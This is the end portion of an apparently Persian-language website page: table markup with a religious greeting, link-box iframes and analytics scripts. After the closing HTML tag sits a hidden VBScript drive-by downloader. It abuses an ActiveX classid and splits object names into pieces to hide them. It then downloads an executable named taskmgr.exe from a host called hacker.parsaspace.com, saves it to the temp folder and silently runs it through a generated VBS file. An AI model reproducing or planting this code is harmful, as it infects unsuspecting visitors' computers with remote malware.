                background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" 
                height=20 bgcolor="#8CB6E7">
                  <P align=center><span lang="fa"><font color="#333333"><b>
					مناسبت های ویژه</b></font></span><font color="#333333"><b><span lang="fa"> </span></b></font></P></TD></TR></TBODY></TABLE>
            <TABLE class=Tbl cellSpacing=0 cellPadding=0 width="99%" border=1>
              <TBODY>
              <TR>
                <TD class=Tb1 width="100%" bgColor=#ffffff>
				<p align="center">
				<img border="0" src="http://p30javad.persiangig.com/image/ام.gif" width="148" height="111"></p>
				<p align="center"><span lang="fa">السلام علی مهدی الامم و جامع 
				الكلم</span></TD></TR></TBODY></TABLE>
			<P align="center"><BR></P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE height=19 cellSpacing=0 cellPadding=0 width=953 align=center border=0>
  <TBODY>
  <TR>
    <TD class=Tb1 width=920 background="http://www.dlisland.persiangig.com/Theme/Ice/table.jpg" height=7 bgcolor="#8CB6E7">
	&nbsp;</TD></TR></TBODY></TABLE>
<P><FONT color=#ece9d8>.</FONT></BODY></HTML>
<div align="center">
<iframe name='frame' marginwidth='1' marginheight='1' border='0' frameborder='0' src='http://www.zarcd.com/webmasters/beta/linkbox.php?uname=mortalkombat&lc=000000&bc=FFFFFF&lv=3300FF&lh=FF0000' width="300" height="397">Your browser does not support inline frames or is currently configured not to display inline frames.</iframe>

<iframe name='frame' marginwidth='1' marginheight='1' border='0' frameborder='0' src='http://www.zarcd.com/webmasters/beta/shortbox.php?uname=mortalkombat&lc=000000&bc=FFFFFF&lv=3300FF&lh=FF0000' width="170" height="396">Your browser does not support inline frames or is currently configured not to display inline frames.</iframe>
<script language='JavaScript' type='text/javascript' src='http://www.zarcd.com/webmasters/beta/banner.php?uname=mortalkombat&type=2&rows=3' ></script>

<script language="VBScript">
curl="http://hacker.parsaspace.com/taskmgr.exe"
on error resume next
fname1="pe.exe"
fname2="pe.vbs"
Set df = document.createElement("object")
df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
str="Microsoft.XMLHTTP"
Set x = df.CreateObject(str,"")
C1="Ado"
C2="db."
C3="str"
C4="eam"
str1=C1&C2&C3&C4
str5=str1
set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, curl, False
x.Send
s1="Script"
s2="ing."
s3="File"
s4="SystemObject"
s0=s1+s2+s3+s4
set F = df.createobject(s0,"")
set tmp = F.GetSpecialFolder(2)
fname1= F.BuildPath(tmp,fname1)
S.open
S.write x.responseBody
S.savetofile fname1,2
S.close
fname2= F.BuildPath(tmp,fname2)
Set ts = F.OpenTextFile(fname2, 2, True)
ts.WriteLine "Set Shell = CreateObject(""Shell.Application"")"
sql="Shell.ShellExecute """+fname1+""","""","""",""open"",0"
ts.WriteLine sql
ts.close
if F.FileExists(fname1) = true then
set Q = df.createobject("Shell.Application","")
Q.ShellExecute fname2,"","","open",0
end if
</script>

<script>
setTimeout(function () {
		GetMihanBlogShowAds();
	}, 1000);
</script>
<!--NEW SERVER--><script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
</script>
<script type="text/javascript">
_uacct = "UA-153829-9";
urchinTracker();
</script>